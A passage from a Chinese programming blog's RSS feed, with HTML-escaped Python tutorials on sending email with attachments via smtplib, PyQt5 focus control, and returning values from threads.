&lt;span style=&#34;color:#75715e&#34;&gt;# pwd为qq邮箱的授权码&lt;/span&gt;
pwd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;nzrVVVVVVVV&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 发件人的邮箱&lt;/span&gt;
sender_qq_mail &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;13VVVVVVV@qq.com&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 收件人邮箱&lt;/span&gt;
receiver &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;13VVVVVVVVV@qq.com&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# 邮件的正文内容&lt;/span&gt;
mail_content &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;你好，这是使用python登录qq邮箱发邮件的测试&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 邮件标题&lt;/span&gt;
mail_title &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Max&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;s的邮件&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# ssl登录&lt;/span&gt;
smtp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SMTP_SSL(host_server)
&lt;span style=&#34;color:#75715e&#34;&gt;# set_debuglevel()是用来调试的。参数值为1表示开启调试模式，参数值为0关闭调试模式&lt;/span&gt;
smtp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;set_debuglevel(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
smtp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ehlo(host_server)
smtp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;login(sender_qq, pwd)

msg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MIMEText(mail_content, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;plain&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;)
msg[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Subject&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Header(mail_title, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;)
msg[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;From&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sender_qq_mail
msg[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;To&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; receiver
smtp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendmail(sender_qq_mail, receiver, msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;as_string())
smtp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;quit()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2发送带附件的邮件&#34;&gt;2.发送带附件的邮件&lt;/h2&gt;
&lt;p&gt;使用MIMEMultipart来标示这个邮件是多个部分组成的，然后attach各个部分。如果是附件，则add_header加入附件的声明。&lt;/p&gt;
&lt;p&gt;MIME有很多种类型，这个略麻烦，如果附件是图片格式，我要用MIMEImage，如果是音频，要用MIMEAudio，如果是word、excel，我都不知道该用哪种MIME类型了，得上google去查。最懒的方法就是，&lt;strong&gt;不管什么类型的附件，都用MIMEApplication&lt;/strong&gt;，MIMEApplication默认子类型是application/octet-stream。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; smtplib
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; email.mime.text &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; MIMEText
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; email.mime.image &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; MIMEImage
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; email.mime.multipart &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; MIMEMultipart
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; email.mime.application &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; MIMEApplication 
 
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
        fromaddr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;137xxxx@163.com&amp;#39;&lt;/span&gt;
        password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;
        toaddrs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;137xxxx@163.com&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;137xxxx@qq.com&amp;#39;&lt;/span&gt;]
 
        content &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hello, this is email content.&amp;#39;&lt;/span&gt;
        textApart &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MIMEText(content)
 
        imageFile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1.png&amp;#39;&lt;/span&gt;
        imageApart &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MIMEImage(open(imageFile, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read(), imageFile&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;)[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
        imageApart&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_header(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Disposition&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;attachment&amp;#39;&lt;/span&gt;, filename&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;imageFile)
 
        pdfFile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;算法设计与分析基础第3版PDF.pdf&amp;#39;&lt;/span&gt;
        pdfApart &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MIMEApplication(open(pdfFile, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read())
        pdfApart&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_header(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Disposition&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;attachment&amp;#39;&lt;/span&gt;, filename&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;pdfFile)
    
 
        zipFile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;算法设计与分析基础第3版PDF.zip&amp;#39;&lt;/span&gt;
        zipApart &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MIMEApplication(open(zipFile, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read())
        zipApart&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_header(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Disposition&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;attachment&amp;#39;&lt;/span&gt;, filename&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;zipFile)
 
        m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MIMEMultipart()
        m&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach(textApart)
        m&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach(imageApart)
        m&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach(pdfApart)
        m&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach(zipApart)
        m[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Subject&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;title&amp;#39;&lt;/span&gt;
 
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
            server &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; smtplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SMTP(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;smtp.163.com&amp;#39;&lt;/span&gt;)
            server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;login(fromaddr,password)
            server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendmail(fromaddr, toaddrs, m&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;as_string())
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;success&amp;#39;&lt;/span&gt;)
            server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;quit()
        &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; smtplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SMTPException &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; e:
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;error:&amp;#39;&lt;/span&gt;,e) &lt;span style=&#34;color:#75715e&#34;&gt;#打印错误&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>PyQt5—焦点控制</title>
        <link>https://ac-lm.github.io/posts/pyqt5/pyqt5%E7%84%A6%E7%82%B9%E6%8E%A7%E5%88%B6/</link>
        <pubDate>Mon, 14 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/pyqt5/pyqt5%E7%84%A6%E7%82%B9%E6%8E%A7%E5%88%B6/</guid>
        <description>&lt;h2 id=&#34;1焦点控制&#34;&gt;1.焦点控制&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;setFocus() &lt;span style=&#34;color:#75715e&#34;&gt;# 设置指定控件获取焦点&lt;/span&gt;
setFocusPolicy(Policy)  &lt;span style=&#34;color:#75715e&#34;&gt;# 设置焦点获取策略&lt;/span&gt;
clearFocus()    &lt;span style=&#34;color:#75715e&#34;&gt;# 取消焦点&lt;/span&gt;
FocusWidget()   &lt;span style=&#34;color:#75715e&#34;&gt;# 获取子控件当前聚焦的控件&lt;/span&gt;
FocusNextChild()    &lt;span style=&#34;color:#75715e&#34;&gt;# 聚焦下一个子控件&lt;/span&gt;
FocusPrevious() &lt;span style=&#34;color:#75715e&#34;&gt;# 聚焦上一个子控件&lt;/span&gt;
FocusNextPreviousChild(bool) &lt;span style=&#34;color:#75715e&#34;&gt;# True:下一个   False:上一个&lt;/span&gt;
setTabOrder(pro_widget,next_widget)    &lt;span style=&#34;color:#75715e&#34;&gt;# 静态方法 设置子控件获取焦点的先后顺序&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2policy&#34;&gt;2.Policy&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;Qt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;TabFocus() &lt;span style=&#34;color:#75715e&#34;&gt;# 通过Tab键获取焦点&lt;/span&gt;
Qt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ClickFocus() &lt;span style=&#34;color:#75715e&#34;&gt;# 通过被单击获取焦点&lt;/span&gt;
Qt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;StrongFocus()    &lt;span style=&#34;color:#75715e&#34;&gt;# 可以通过上面两种方式获取焦点&lt;/span&gt;
Qt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;NoFocus()    &lt;span style=&#34;color:#75715e&#34;&gt;# 不能通过上面两种方式获取焦点&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Python—多线程的返回值</title>
        <link>https://ac-lm.github.io/posts/python/python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC/</link>
        <pubDate>Mon, 14 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC/</guid>
        <description>&lt;h2 id=&#34;1问题&#34;&gt;1.问题&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;python&lt;/code&gt; 多线程一般使用 &lt;code&gt;threading&lt;/code&gt; 模块，但 &lt;code&gt;threading&lt;/code&gt; 模块有个问题，无法直接返回线程里面运行的结果，那如果需要线程返回值那如何处理呢&lt;/p&gt;
&lt;h2 id=&#34;2方法一&#34;&gt;2.方法一&lt;/h2&gt;
&lt;p&gt;通过自定义线程类，继承&lt;code&gt;Thread&lt;/code&gt;类，并复写&lt;code&gt;run&lt;/code&gt;方法，在&lt;code&gt;run&lt;/code&gt;方法中写入执行函数的方式，并把返回值赋值给&lt;code&gt;result&lt;/code&gt;，然后通过调用&lt;code&gt;get_result&lt;/code&gt;获取每个进程的返回值&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 多线程类&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;MyThread&lt;/span&gt;(Thread):
    result1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;
    result2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, func, args&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;()):
        super(MyThread, self)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__init__()
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;func &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; func
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;args &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; args

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(self):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;result1, self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;result2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;func(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;args)
        &lt;span style=&#34;color:#75715e&#34;&gt;# 在执行函数的同时，把结果赋值给result,&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;# 然后通过get_result函数获取返回的结果&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_result&lt;/span&gt;(self):
        &lt;span style=&#34;color:#75715e&#34;&gt;# noinspection PyBroadException&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;result1, self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;result2
        &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exception&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;


&lt;span style=&#34;color:#75715e&#34;&gt;# 多线程执行函数&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Mss&lt;/span&gt;(info, window):
    result, furl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; api_test(info, baseurl)
    sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;)
    &lt;span style=&#34;color:#75715e&#34;&gt;# 等待，否则由于子进程过快，主进程未开启进度条，而执行进度条关闭命令导致矛盾&lt;/span&gt;
    window&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; result, furl

t1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MyThread(Mss, args&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;(info, myDia5))
t1&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setDaemon(&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
t1&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()
result, furl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; t1&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_result()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3方法二&#34;&gt;3.方法二&lt;/h2&gt;
&lt;p&gt;通过&lt;code&gt;python&lt;/code&gt;内置的队列&lt;code&gt;Queue&lt;/code&gt;接收子进程的返回值，然后再从中取出&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; threading 
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Queue 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_even&lt;/span&gt;(value, q): 
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; value &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: 
        q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;put(&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;) 
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;: 
        q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;put(&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;) 
        
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;multithreading&lt;/span&gt;(): 
    q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Queue&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Queue() 
    threads &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [] 
    results &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [] 
    
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;): 
    t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; threading&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Thread(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;is_even, args&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;(i, q)) 
    t&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start() 
    threads&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(t) 
    
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; thread &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; threads: 
    thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join() &lt;span style=&#34;color:#75715e&#34;&gt;# 等待子线程结束后，再往后面执行 &lt;/span&gt;
    
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;): 
    results&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()) 
    print(results) 
    
    multithreading() 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Python—多线程的使用</title>
        <link>https://ac-lm.github.io/posts/python/python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9A%84%E4%BD%BF%E7%94%A8/</link>
        <pubDate>Sun, 13 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9A%84%E4%BD%BF%E7%94%A8/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/fnng/p/3670789.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; python 多线程  @虫师 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1单线程&#34;&gt;1.单线程&lt;/h2&gt;
&lt;p&gt;单线程执行任务时需要进行排序，比如下面代码中的听音乐和看电影两件事。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# coding=utf-8&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; time &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ctime,sleep

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;music&lt;/span&gt;(func):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;):
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;I was listening to &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;func&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;! &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;ctime()&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
        sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;move&lt;/span&gt;(func):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;):
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;I was at the &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;func&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;! &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;ctime()&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
        sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
    music(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;爱情买卖&amp;#39;&lt;/span&gt;)
    move(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;阿凡达&amp;#39;&lt;/span&gt;)
    
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;all over &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;ctime()&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在执行时，先执行听音乐这件事，通过&lt;code&gt;for&lt;/code&gt;循环来控制音乐播放两次，每首音乐播放需要1秒钟。接着执行看电影，每一场电影需要5秒钟，同样通过&lt;code&gt;for&lt;/code&gt;循环看两遍。最后输出结束时间。&lt;/p&gt;
&lt;p&gt;运行结果：&lt;/p&gt;
